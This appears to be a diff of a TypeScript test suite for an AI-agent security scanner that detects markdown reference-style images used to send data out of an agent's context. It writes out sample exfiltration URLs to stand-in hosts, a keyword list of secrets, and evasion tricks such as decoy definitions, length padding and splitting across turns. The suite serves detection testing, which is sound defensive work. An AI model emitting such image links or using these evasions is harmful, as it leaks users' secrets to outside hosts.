@@ -45,8 +45,40 @@ describe('reference-style markdown image exfiltration (#219)', () => {
     expect(flags('See the [report][r] for details.\n\n[r]: https://c.example/p.png?data=1')).toBe(false); // a link, not an image
     expect(flags('![x](https://example.com/a.png)\n\n[r]: https://c.example/p.png?data=1')).toBe(false); // inline image
   });
-  it('the first definition of a label wins', () => {
-    expect(flags('![x][r]\n\n[r]: https://c.example/ok.png?v=1\n[r]: https://c.example/p.png?data=1')).toBe(false);
+  it('flags a label if ANY definition of it sends data out, so a decoy cannot hide the real one', () => {
+    const real = '[r]: https://evil.example/p.png?data=S';
+    expect(flags(`![x][r]\n\n[r]: https://ok.example/a.png\n${real}`)).toBe(true);
+    expect(flags('![x][r]\n\n```\n[r]: https://ok.example/a.png\n```\n' + real)).toBe(true);
+    expect(flags('![x][r]\n\nNotes\n[r]: https://ok.example/a.png\n\n' + real)).toBe(true);
+    expect(flags('![x][r]\n\n<!--\n[r]: https://ok.example/a.png\n-->\n' + real)).toBe(true);
+    expect(flags('![x][r]\n\n[r]: https://ok.example/a.png "unterminated\n' + real)).toBe(true);
+  });
+  it('sees definitions in block quotes and list items, with tabs', () => {
+    expect(flags('![x][r]\n\n> [r]: https://c.example/p.png?data=1')).toBe(true);
+    expect(flags('![x][r]\n\n- item\n\n\t[r]: https://c.example/p.png?data=1')).toBe(true);
+    expect(flags('![x][r]\n\n10. item\n\n    [r]: https://c.example/p.png?data=1')).toBe(true);
+  });
+  it('has no length caps to pad past: long path, long query, long alt text, long url', () => {
+    expect(flags(`![x][r]\n\n[r]: https://c.example/${'a'.repeat(3000)}.png?data=1`)).toBe(true);
+    expect(flags(`![x][r]\n\n[r]: https://c.example/p.png?a=${'b'.repeat(3000)}&data=1`)).toBe(true);
+    expect(flags(`![${'alt '.repeat(900)}][r]\n\n[r]: https://c.example/p.png?data=1`)).toBe(true);
+  });
+  it('a finding carries the definition as a related span, used by cross-turn scanning but not by sanitization', () => {
+    const text = `![x][r]\n\n${DEF}`;
+    const t = detector.scan(text).threats[0];
+    expect(text.slice(t.relatedLocation!.offset, t.relatedLocation!.offset + 4)).toBe('[r]:');
+    expect(t.location!.length).toBe('![x][r]'.length);
+  });
+  it('catches an image in one turn and its definition in the next', async () => {
+    const armor = AgentArmor.regexOnly();
+    const turns = [
+      { role: 'document' as const, content: 'Summary of the quarter.\n\n![chart][r]' },
+      { role: 'document' as const, content: `Appendix.\n\n${DEF}` },
+    ];
+    const sync = armor.scanSession(turns);
+    expect(sync.crossTurnThreats.some((t) => t.detectorId === 'markdown-reference-exfiltration')).toBe(true);
+    const async = await armor.scanSessionAsync(turns);
+    expect(async.crossTurnThreats.some((t) => t.detectorId === 'markdown-reference-exfiltration')).toBe(true);
   });
 
   it('is wired into a scan and its image is replaced', () => {
@@ -67,7 +99,7 @@ describe('reference-style markdown image exfiltration (#219)', () => {
 /** Slow, independent reading of the same rules, to fuzz the regex version against. */
 function reference(content: string): Array<[number, number]> {
   const KEYWORDS = ['data', 'token', 'secret', 'key', 'context', 'conversation', 'history', 'session', 'password', 'credential', 'api_key', 'api-key', 'apikey', 'env'];
-  const isLT = (c: string) => c === '\n' || c === '\r' || c === ' ' || c === ' ';
+  const isLT = (c: string) => c === '\n' || c === '\r' || c === '\u2028' || c === '\u2029';
   const isWs = (c: string) => /\s/.test(c);
   const norm = (s: string) => s.trim().replace(/\s+/g, ' ').toLowerCase();
   const flaggedUrl = (url: string): boolean => {
@@ -76,57 +108,51 @@ function reference(content: string): Array<[number, number]> {
     if (!m) return false;
     u = u.slice(m[0].length);
     let q = -1;
-    for (let i = 0; i <= 200 && i < u.length; i++) {
+    for (let i = 0; i < u.length; i++) {
       if (isWs(u[i]) || u[i] === '>') return false;
       if (u[i] === '?') { q = i; break; }
     }
     if (q < 0) return false;
     const query = u.slice(q + 1);
-    for (let start = 0; start <= 200 && start < query.length; start++) {
+    for (let start = 0; start < query.length; start++) {
+      if (isWs(query[start]) || query[start] === '>') return false; // the query ends here
       for (const k of KEYWORDS) {
         if (query.slice(start, start + k.length).toLowerCase() !== k) continue;
         const nxt = query[start + k.length];
-        const wordEnd = nxt === undefined || !/[A-Za-z0-9_]/.test(nxt);
-        // every character from `?` to the keyword start must be neither whitespace nor `>`
-        const gap = query.slice(0, start);
-        if (wordEnd && !/[\s>]/.test(gap)) return true;
+        if (nxt === undefined || !/[A-Za-z0-9_]/.test(nxt)) return true;
       }
     }
     return false;
   };
-  const flagged = new Set<string>();
-  const seen = new Set<string>();
+  const flagged = new Map<string, number>();
   for (let i = 0; i < content.length; i++) {
     if (!(i === 0 || isLT(content[i - 1]))) continue;
     let p = i;
-    let spaces = 0;
-    while (content[p] === ' ' && spaces < 3) { p++; spaces++; }
+    while (content[p] === ' ' || content[p] === '\t' || content[p] === '>') p++;
     if (content[p] !== '[') continue;
     let e = p + 1;
     while (e < content.length && content[e] !== ']' && !isLT(content[e])) e++;
     const labelLen = e - (p + 1);
-    if (content[e] !== ']' || labelLen < 1 || labelLen > 200) continue;
+    if (content[e] !== ']' || labelLen < 1 || labelLen > 999) continue;
     if (content[e + 1] !== ':') continue;
     let d = e + 2;
     while (content[d] === ' ' || content[d] === '\t') d++;
     if (content[d] === '\r' && content[d + 1] === '\n') d++;
-    if (content[d] === '\n') { d++; while (content[d] === ' ' || content[d] === '\t') d++; }
+    if (content[d] === '\n') { d++; while (content[d] === ' ' || content[d] === '\t' || content[d] === '>') d++; }
     let dest = '';
     if (content[d] === '<') {
       let g = d + 1;
       while (g < content.length && content[g] !== '>' && !isLT(content[g])) g++;
-      if (content[g] !== '>' || g - (d + 1) < 1 || g - (d + 1) > 2000) continue;
+      if (content[g] !== '>' || g - (d + 1) < 1) continue;
       dest = content.slice(d, g + 1);
     } else {
       if (d >= content.length || isWs(content[d])) continue;
       let g = d;
-      while (g < content.length && !isWs(content[g]) && g - d < 2001) g++;
+      while (g < content.length && !isWs(content[g])) g++;
       dest = content.slice(d, g);
     }
     const label = norm(content.slice(p + 1, e));
-    if (seen.has(label)) continue;
-    seen.add(label);
-    if (flaggedUrl(dest)) flagged.add(label);
+    if (!flagged.has(label) && flaggedUrl(dest)) flagged.set(label, p);
   }
   const out: Array<[number, number]> = [];
   let i = 0;
@@ -134,20 +160,20 @@ function reference(content: string): Array<[number, number]> {
     if (!(content[i] === '!' && content[i + 1] === '[')) { i++; continue; }
     let a = i + 2;
     while (a < content.length && content[a] !== ']' && !isLT(content[a])) a++;
-    const altLen = a - (i + 2);
-    if (content[a] !== ']' || altLen > 200) { i++; continue; }
+    if (content[a] !== ']') { i++; continue; }
     const alt = content.slice(i + 2, a);
     let end = a + 1;
-    let label = alt;
+    let label: string | undefined;
     if (content[a + 1] === '[') {
       let b = a + 2;
       while (b < content.length && content[b] !== ']' && !isLT(content[b])) b++;
-      if (content[b] === ']' && b - (a + 2) <= 200) {
+      if (content[b] === ']' && b - (a + 2) <= 999) {
         end = b + 1;
         if (content.slice(a + 2, b).trim() !== '') label = content.slice(a + 2, b);
       }
     } else if (content[a + 1] === '(') { i++; continue; }
-    const key = norm(label);
+    if (label === undefined && alt.length <= 999) label = alt;
+    const key = label === undefined ? '' : norm(label);
     if (key !== '' && flagged.has(key)) out.push([i, end - i]);
     i = end;
   }
@@ -171,6 +197,7 @@ describe('matches a slow reference on generated documents (#219)', () => {
     'https://c.example/p.png?data=X', 'http://c.example/?token=1', 'https://c.example/p.png?v=3', 'https://c.example/data/p.png',
     '<https://c.example/p.png?secret=1>', 'https://c.example/?q=1&key=2', 'https://c.example/p.png?monkey=1', 'https://c.example/p.png?api_key=1',
     'ftp://c.example/?data=1', 'https://c.example/p.png?', 'https://c.example/p.png?env', '<https://c.example/p.png?data=1',
+    'https://c.example/' + 'p'.repeat(300) + '.png?a=' + 'q'.repeat(300) + '&data=1', 'https://ok.example/a.png',
   ];
   const NOISE = ['text ', ' ', '\n', '\n\n', '\r\n', '\t', '(', ')', '[', ']', '!', ':', '<', '>', '?', 'a', '\u2028', 'x'.repeat(40)];
   const label = (rand: () => number) => LABELS[Math.floor(rand() * LABELS.length)];
@@ -180,6 +207,7 @@ describe('matches a slow reference on generated documents (#219)', () => {
     if (r < 0.22) {
       const form = rand();
       const l = label(rand);
+      if (form < 0.05) return `![${'alt '.repeat(300)}][${l}]`;
       if (form < 0.4) return `![alt][${l}]`;
       if (form < 0.6) return `![${l}][]`;
       if (form < 0.8) return `![${l}]`;
@@ -187,7 +215,7 @@ describe('matches a slow reference on generated documents (#219)', () => {
       return `![alt][${l}`;
     }
     if (r < 0.5) {
-      const indent = pick(rand, ['', ' ', '   ', '    ']);
+      const indent = pick(rand, ['', ' ', '   ', '    ', '\t', '> ', '>> ']);
       const sep = pick(rand, [' ', '', '\t', '\n  ', '\n\n']);
       const title = rand() < 0.2 ? ' "title"' : '';
       return `\n${indent}[${label(rand)}]:${sep}${pick(rand, URLS)}${title}\n`;
@@ -228,6 +256,11 @@ describe('stays linear (#219)', () => {
     ['bare image openers', '!['],
     ['question marks in a url', '![][b]'.repeat(50) + '\n[b]: http://' + '?'.repeat(199) + ' '],
     ['same label many times', '![a][b]\n[b]: https://x.example/?data=1\n'],
+    ['decoy definitions then one real one', '[b]: https://ok.example/a.png\n'],
+    ['long url without a keyword', '[b]: https://x.example/' + 'p'.repeat(1900) + '?v=1\n'],
+    ['long indent before a bracket', ' '.repeat(1000) + '[\n'],
+    ['block quote markers', '> > > > > > [b]: https://x.example/?data=1\n'],
+    ['image openers over one far bracket', '![![![![![![![![![![x]'],
   ];
   it.each(shapes)('1,000,000 characters of %s scan in well under a second', (_name, unit) => {
     const text = unit.repeat(Math.ceil(1_000_000 / unit.length));
